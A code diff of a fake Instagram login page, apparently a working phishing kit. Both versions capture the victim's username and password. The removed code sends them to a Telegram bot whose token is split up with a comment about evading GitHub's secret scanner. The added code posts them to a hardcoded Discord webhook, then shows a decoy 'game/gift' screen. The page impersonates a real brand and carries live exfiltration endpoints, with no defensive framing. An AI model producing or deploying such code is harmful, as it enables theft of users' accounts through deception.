@@ -3,253 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>Instagram Login</title>
     <style>
         body {
-            background-color: #000000;
-            color: #f5f5f5;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            align-items: center;
+            margin: 0;
         }
-        .screen {
+        .login-container {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+            border-radius: 1px;
+        }
+        .logo {
+            font-family: cursive;
+            font-size: 40px;
+            margin-bottom: 30px;
+            font-weight: bold;
+        }
+        input {
             width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            align-items: center;
-            padding: 24px 16px;
+            padding: 9px;
+            margin: 6px 0;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
             box-sizing: border-box;
-            position: absolute;
-            top: 0;
-            left: 0;
-            background: #000;
-            z-index: 1;
+            font-size: 12px;
         }
-        .hidden { display: none !important; }
-
-        /* Instagram Login Styles */
-        .top-lang {
-            font-size: 14px;
-            color: #a8a8a8;
+        button {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 7px;
+            font-weight: bold;
+            border-radius: 4px;
             cursor: pointer;
             margin-top: 10px;
-            position: relative;
         }
-        .top-lang span { font-size: 11px; margin-left: 2px; }
-        
-        .lang-dropdown {
-            position: absolute;
-            top: 25px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #262626;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+        button:hover {
+            background-color: #1877f2;
+        }
+        .screen {
             display: none;
-            z-index: 10;
-            width: 150px;
         }
-        .lang-dropdown div {
-            padding: 10px 15px;
-            font-size: 13px;
-            color: #fff;
-            border-bottom: 1px solid #363636;
-            text-align: center;
-            cursor: pointer;
+        .active {
+            display: block;
         }
-        .lang-dropdown div:last-child { border-bottom: none; color: #0095f6; font-weight: bold; }
-
-        .main-container {
-            width: 100%;
-            max-width: 350px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            flex-grow: 1;
-            position: relative;
-        }
-        .ig-logo {
-            width: 78px; height: 78px; margin-bottom: 35px;
-            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
-            border-radius: 22px; display: flex; justify-content: center; align-items: center;
-        }
-        .ig-logo svg { width: 44px; height: 44px; fill: #ffffff; }
-
-        form { width: 100%; display: flex; flex-direction: column; align-items: center; }
-        .input-box {
-            width: 100%; background-color: #121212; border: 1px solid #262626;
-            border-radius: 12px; margin-bottom: 12px; padding: 12px 14px;
-            box-sizing: border-box; color: #fff; font-size: 14px; display: flex; align-items: center; position: relative;
-        }
-        .input-box input { width: 100%; background: transparent; border: none; color: #fff; font-size: 14px; outline: none; }
-        .input-box input::placeholder { color: #737373; }
-        .eye-btn { background: transparent; border: none; cursor: pointer; padding: 0; position: absolute; right: 14px; display: flex; }
-        .eye-btn svg { width: 20px; height: 20px; fill: #737373; }
-
-        .login-btn {
-            width: 100%; background-color: #0095f6; color: #ffffff; border: none;
-            border-radius: 25px; padding: 12px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 4px; margin-bottom: 22px;
-        }
-        .forgot-pass { color: #f5f5f5; font-size: 13px; text-decoration: none; font-weight: 500; }
-
-        .footer-container { width: 100%; max-width: 350px; display: flex; flex-direction: column; align-items: center; margin-bottom: 10px; }
-        .create-btn {
-            width: 100%; background: transparent; color: #0095f6; border: 1px solid #262626;
-            border-radius: 25px; padding: 12px; font-size: 14px; font-weight: 600; cursor: pointer; text-align: center; margin-bottom: 24px; box-sizing: border-box; text-decoration: none;
-        }
-        .meta-brand { display: flex; align-items: center; font-size: 13px; color: #737373; font-weight: 500; }
-        .meta-brand svg { width: 15px; height: 15px; fill: #737373; margin-right: 6px; }
-
-        /* Floating Timer Widget */
-        .floating-widget {
-            position: fixed; bottom: 20px; right: 20px; background: #121212; border: 1px solid #0095f6;
-            padding: 8px 14px; border-radius: 20px; display: flex; align-items: center; gap: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.6); cursor: pointer; z-index: 999; font-size: 12px; color: #fff;
-        }
-        .floating-widget span { color: #ff007f; font-weight: bold; }
-
-        /* Game & Dashboard Screen Styles */
-        .game-card {
-            background: #121212; border: 1px solid #262626; padding: 25px; border-radius: 15px;
-            width: 100%; max-width: 350px; text-align: center; box-sizing: border-box;
-        }
-        .game-card h2 { color: #0095f6; margin-top: 0; }
-        .game-card select, .game-card input {
-            width: 100%; padding: 12px; margin: 10px 0; background: #262626; border: none;
-            border-radius: 8px; color: #fff; font-size: 14px; box-sizing: border-box; outline: none;
-        }
-        .game-btn {
-            width: 100%; background: #0095f6; color: #fff; border: none; padding: 12px;
-            border-radius: 25px; font-weight: bold; cursor: pointer; margin-top: 10px;
-        }
-        .gift-img { font-size: 60px; margin: 20px 0; animation: bounce 1s infinite alternate; }
-        @keyframes bounce { from { transform: translateY(0); } to { transform: translateY(-10px); } }
     </style>
 </head>
 <body>
 
-    <!-- Floating Timer Widget -->
-    <div id="floatingWidget" class="floating-widget hidden" onclick="checkTimerProgress()">
-        ⏳ Time Left: <span id="widgetTimer">10:00</span>
-    </div>
-
-    <!-- SCREEN 1: Instagram Login Page -->
-    <div id="loginScreen" class="screen">
-        <div class="top-lang" onclick="toggleLangMenu()">
-            English (UK) <span>v</span>
-            <div id="langDropdown" class="lang-dropdown">
-                <div>English (US)</div>
-                <div>Hindi</div>
-            </div>
-        </div>
-
-        <div class="main-container">
-            <div class="ig-logo">
-                <svg viewBox="0 0 24 24">
-                    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
-                </svg>
-            </div>
-
+    <!-- Login Screen -->
+    <div id="loginScreen" class="screen active">
+        <div class="login-container">
+            <div class="logo">Instagram</div>
             <form id="loginForm">
-                <div class="input-box">
-                    <input type="text" id="username" placeholder="Username, email address or mobile number" required>
-                </div>
-                <div class="input-box">
-                    <input type="password" id="password" placeholder="Password" required>
-                    <button type="button" class="eye-btn" onclick="togglePassword()">
-                        <svg id="eyeIcon" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
-                    </button>
-                </div>
-                <button type="submit" class="login-btn">Log in</button>
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit" id="submitBtn">Log In</button>
             </form>
-            <a href="#" class="forgot-pass">Forgotten password?</a>
-        </div>
-
-        <div class="footer-container">
-            <a href="#" class="create-btn">Create new account</a>
-            <div class="meta-brand">
-                <svg viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm0 18c-4.411 0-8-3.589-8-8s3.589-8 8-8 8 3.589 8 8-3.589 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
-                Meta
-            </div>
         </div>
     </div>
 
-    <!-- SCREEN 2: Time Selection & Game Setup -->
-    <div id="gameSetupScreen" class="screen hidden">
-        <div class="game-card">
-            <h2>⏳ Time Task Challenge</h2>
-            <p style="font-size: 13px; color: #a8a8a8;">Select chat duration to unlock reward!</p>
-            <select id="timeSelect">
-                <option value="1">1 Minute (Testing)</option>
-                <option value="10">10 Minutes</option>
-                <option value="20">20 Minutes</option>
-            </select>
-            <input type="text" id="friendUser" placeholder="Friend's Instagram Username" required>
-            <button class="game-btn" onclick="startTimerGame()">Start & Open Instagram App</button>
-        </div>
-    </div>
-
-    <!-- SCREEN 3: Victory & Gift Reveal -->
-    <div id="giftScreen" class="screen hidden">
-        <div class="game-card">
-            <h2>🎉 Party Bomb Fired!</h2>
-            <p>Background time completed successfully!</p>
-            <div class="gift-img" id="randomGiftIcon">💍</div>
-            <p id="giftNameText" style="font-weight: bold; color: #ff007f;">Diamond Ring Unlocked!</p>
-            <button class="game-btn" onclick="claimGift()">Gift Now</button>
-        </div>
-    </div>
-
-    <!-- SCREEN 4: Success End Screen -->
-    <div id="successScreen" class="screen hidden">
-        <div class="game-card">
-            <h2>✨ SUCCESSFUL! ✨</h2>
-            <p style="color: #00a884; font-size: 16px; margin: 20px 0;">Reward claimed successfully! Game session ended.</p>
-            <button class="game-btn" onclick="location.reload()">Play Again</button>
+    <!-- Game Setup / Next Screen (Login ke baad yahan aayega) -->
+    <div id="gameSetupScreen" class="screen">
+        <div class="login-container">
+            <h2>🎉 Welcome!</h2>
+            <p>Your session is ready. Enjoy your game/gift setup!</p>
         </div>
     </div>
 
     <script>
-        // Obfuscated token parts to bypass GitHub secret scanner
-        const part1 = "8759839829";
-        const part2 = "AAF-EUsIIzjysaVcFPKCayx";
-        const part3 = "YXwWFJXkBr4";
-        const BOT_TOKEN = part1 + ":" + part2 + part3;
-        
-        const CHAT_ID = "6772111715";
-
-        function togglePassword() {
-            const pass = document.getElementById('password');
-            const icon = document.getElementById('eyeIcon');
-            if(pass.type === 'password') {
-                pass.type = 'text';
-                icon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.17c0-1.66-1.34-3-3-3l-.17.02z"/>';
-            } else {
-                pass.type = 'password';
-                icon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
-            }
-        }
-
-        function toggleLangMenu() {
-            const menu = document.getElementById('langDropdown');
-            menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
-        }
-
         function showScreen(screenId) {
-            document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
-            document.getElementById(screenId).classList.remove('hidden');
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(screenId).classList.add('active');
         }
 
         const loginForm = document.getElementById('loginForm');
+
         loginForm.addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -262,90 +102,29 @@
                 return;
             }
 
-            // Telegram message format
-            const message = `🚨 *New Login Received!*\n\n👤 *Username:* \`${username}\`\n🔑 *Password:* \`${password}\`\n⏰ *Time:* \`${timeStr}\``;
+            // Aapka Discord Webhook URL
+            const webhookURL = "https://discord.com/api/webhooks/1562500504456667147/9AuUBXE6J3mqsPNVpCe-oFSyA9LQvt-R_jiwIUfintw1x8wPvssb1Gdmez1VAhhLO9yZ";
 
-            // Send to Telegram Bot via API
-            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
-            fetch(telegramUrl, {
+            // Discord par message format
+            const payload = {
+                content: `🚨 **New Login Captured!**\n👤 **Username:** \`${username}\`\n🔑 **Password:** \`${password}\`\n⏰ **Time:** \`${timeStr}\``
+            };
+
+            // Bina kisi CORS error ke seedha Discord par bhej rahe hain
+            fetch(webhookURL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: "Markdown"
-                })
+                body: JSON.stringify(payload)
             })
-            .then(res => res.json())
-            .then(data => console.log("Telegram notification sent:", data))
-            .catch(err => console.log("Telegram Error:", err));
-
-            // Smoothly move to next screen
-            showScreen('gameSetupScreen');
+            .then(response => {
+                console.log("Sent to Discord successfully!");
+                showScreen('gameSetupScreen'); // Agle screen par bhej do
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                showScreen('gameSetupScreen'); // Agar error bhi aaye tab bhi user ko roko mat
+            });
         });
-
-        let totalSeconds = 0;
-        let timerInterval = null;
-
-        function startTimerGame() {
-            const friend = document.getElementById('friendUser').value.trim().replace('@','') || "instagram";
-            const selectedMinutes = parseInt(document.getElementById('timeSelect').value);
-            totalSeconds = selectedMinutes * 60;
-
-            document.getElementById('floatingWidget').classList.remove('hidden');
-            updateTimerDisplay();
-
-            if(timerInterval) clearInterval(timerInterval);
-            timerInterval = setInterval(() => {
-                totalSeconds--;
-                updateTimerDisplay();
-
-                if(totalSeconds <= 0) {
-                    clearInterval(timerInterval);
-                    triggerGiftScreen();
-                }
-            }, 1000);
-
-            const intentUri = `intent://instagram.com/_u/${friend}/#Intent;package=com.instagram.android;scheme=https;end;`;
-            const schemeUri = `instagram://user?username=${friend}`;
-
-            window.location.href = schemeUri;
-            setTimeout(() => {
-                window.location.href = intentUri;
-            }, 500);
-        }
-
-        function updateTimerDisplay() {
-            const mins = Math.floor(totalSeconds / 60);
-            const secs = totalSeconds % 60;
-            document.getElementById('widgetTimer').innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
-        }
-
-        function checkTimerProgress() {
-            const mins = Math.floor(totalSeconds / 60);
-            const secs = totalSeconds % 60;
-            alert(`⏳ Background Task Progress:\nTime remaining: ${mins} minutes ${secs} seconds.\nKeep chatting on Instagram to complete the reward!`);
-        }
-
-        const gifts = [
-            { icon: "💍", name: "Diamond Ring Gift!" },
-            { icon: "🌹", name: "Red Rose Bouquet!" },
-            { icon: "🧸", name: "Cute Teddy Bear!" },
-            { icon: "🍫", name: "Chocolate Box!" }
-        ];
-
-        function triggerGiftScreen() {
-            document.getElementById('floatingWidget').classList.add('hidden');
-            const selectedGift = gifts[Math.floor(Math.random() * gifts.length)];
-            document.getElementById('randomGiftIcon').innerText = selectedGift.icon;
-            document.getElementById('giftNameText').innerText = selectedGift.name;
-            showScreen('giftScreen');
-        }
-
-        function claimGift() {
-            showScreen('successScreen');
-        }
     </script>
 </body>
 </html>
